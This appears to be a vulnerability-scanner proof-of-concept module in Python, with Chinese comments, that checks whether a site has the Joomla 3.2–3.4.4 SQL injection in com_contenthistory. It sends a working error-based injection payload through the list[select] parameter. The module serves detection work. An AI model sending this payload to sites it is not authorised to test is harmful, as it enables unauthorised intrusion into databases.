# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re


class Vuln(ABVuln):
    vuln_id = 'Joomla_0072'  # 平台漏洞编号
    name = 'Joomla 3.2-3.4.4版本 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-10-24'  # 漏洞公布时间
    desc = '''
        漏洞触发的代码位于：/administrator/components/com_contenthistory/models/history.php, getListQuery()函数内：
        代码对取到的list[]数组进行了遍历，并做相应的过滤、拆分，可以看到list[select]没有处理逻辑，会进入default的case，后续$this->setState('list.' . $name, $value)代码执行后，导致请求中list[select]变量没有任何变量被直接赋值给Model属性。
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/3548/'
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Joomla!'  # 漏洞组件名称
    product_version = '3.2-3.4.4版本'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '29f915df-db0c-4a9d-88ea-004bcd3aede4'  # 平台 POC 编号
    author = '47bwy'  # POC编写者
    create_date = '2018-06-25'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = "/index.php?option=com_contenthistory&view=history&item_id=1&list[ordering]=&type_id=1&list[select]=(exp(~(select * from(select md5(c))x)))"
            url = self.target + payload
            r = requests.get(url)

            if '4a8a08f09d37b73795649038408b5f33' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
